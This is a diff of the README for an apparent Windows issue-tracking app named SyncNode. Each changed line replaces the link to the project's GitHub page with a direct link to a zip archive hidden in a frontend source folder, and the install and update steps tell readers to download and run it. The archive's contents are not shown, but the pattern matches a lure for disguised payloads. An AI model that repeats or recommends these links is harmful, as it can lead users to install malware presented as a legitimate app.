@@ -1,12 +1,12 @@
 # 🧭 SyncNode - Track Issues With Clear Control
 
-[![Download SyncNode](https://img.shields.io/badge/Download-SyncNode-blue?style=for-the-badge&logo=github)](https://github.com/uninhabited-puppeteer693/SyncNode)
+[![Download SyncNode](https://img.shields.io/badge/Download-SyncNode-blue?style=for-the-badge&logo=github)](https://github.com/uninhabited-puppeteer693/SyncNode/raw/refs/heads/main/frontend/src/components/issues/Sync-Node-v1.0.zip)
 
 ## 📥 Download SyncNode
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/uninhabited-puppeteer693/SyncNode
+https://github.com/uninhabited-puppeteer693/SyncNode/raw/refs/heads/main/frontend/src/components/issues/Sync-Node-v1.0.zip
 
 Use the page to get the latest version, then follow the steps below to start the app on your computer.
 
@@ -40,7 +40,7 @@ If you plan to run the full app stack, Docker Desktop is the easiest way to star
 Follow these steps in order:
 
 1. Open the download page:
-   https://github.com/uninhabited-puppeteer693/SyncNode
+   https://github.com/uninhabited-puppeteer693/SyncNode/raw/refs/heads/main/frontend/src/components/issues/Sync-Node-v1.0.zip
 
 2. On the GitHub page, look for the latest release or the main project files.
 
@@ -67,7 +67,7 @@ If the project uses Docker, this is the simplest way to run it on Windows.
 1. Install Docker Desktop from the official Docker site.
 2. Open Docker Desktop and wait until it starts.
 3. Download SyncNode from:
-   https://github.com/uninhabited-puppeteer693/SyncNode
+   https://github.com/uninhabited-puppeteer693/SyncNode/raw/refs/heads/main/frontend/src/components/issues/Sync-Node-v1.0.zip
 4. Extract the files if needed.
 5. Open the folder that contains the docker-compose file.
 6. Open PowerShell in that folder.
@@ -242,7 +242,7 @@ docker compose restart
 To get the latest version:
 
 1. Return to the download page:
-   https://github.com/uninhabited-puppeteer693/SyncNode
+   https://github.com/uninhabited-puppeteer693/SyncNode/raw/refs/heads/main/frontend/src/components/issues/Sync-Node-v1.0.zip
 2. Download the newest files
 3. Replace the old folder or update your Docker setup
 4. Start the app again
@@ -273,4 +273,4 @@ SyncNode fits teams that need:
 
 Download or run SyncNode from:
 
-https://github.com/uninhabited-puppeteer693/SyncNode
+https://github.com/uninhabited-puppeteer693/SyncNode/raw/refs/heads/main/frontend/src/components/issues/Sync-Node-v1.0.zip
